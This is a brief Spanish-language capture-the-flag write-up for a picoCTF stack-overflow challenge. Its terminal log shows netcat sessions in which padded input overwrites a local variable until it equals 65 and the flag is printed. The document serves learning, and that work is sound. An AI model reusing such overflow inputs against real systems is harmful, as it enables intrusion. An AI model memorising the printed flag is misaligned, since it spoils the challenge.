# Level 2
## Objetivo
Smash the stack

Additional details will be available after launching your challenge instance.
## Pistas
Do anything you can to change `num`.
When you change `num`, view the value as hexadecimal.
## Solucion
Hicimos varias pruebas para ver como cambiar el numero al final fue pasandole cierta cantidad de caracteres y el ultimo te podras de dar cuenta que lo pasa a binario y luego lo pasa a decimal y ese valor si es igual a 65 nos da la bandera 
Asi que en un convertidor en linea primero convertimos el 65 a binario y luego a texto para asi saber que valor utilizar
diego@kali:~$ nc saturn.picoctf.net 63315
Enter a string:                         g

num is 103
Bye!
                                                                                                                    
diego@kali:~$ nc saturn.picoctf.net 63315
Enter a string:                          a

num is 24864
Bye!
                                                                                                                    
diego@kali:~$ nc saturn.picoctf.net 63315
Enter a string:                         a

num is 97
Bye!
                                                                                                                    
diego@kali:~$ nc saturn.picoctf.net 63315
Enter a string:                          

num is 32
Bye!
                                                                                                                    
diego@kali:~$ nc saturn.picoctf.net 63315
Enter a string:                         A

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_ee58441a}

## Notas Adicionales
|comando|descripcion|
|-------|-----------|
|xxx|xxx|
## Referencias
https://www.rapidtables.com/convert/number/binary-to-ascii.html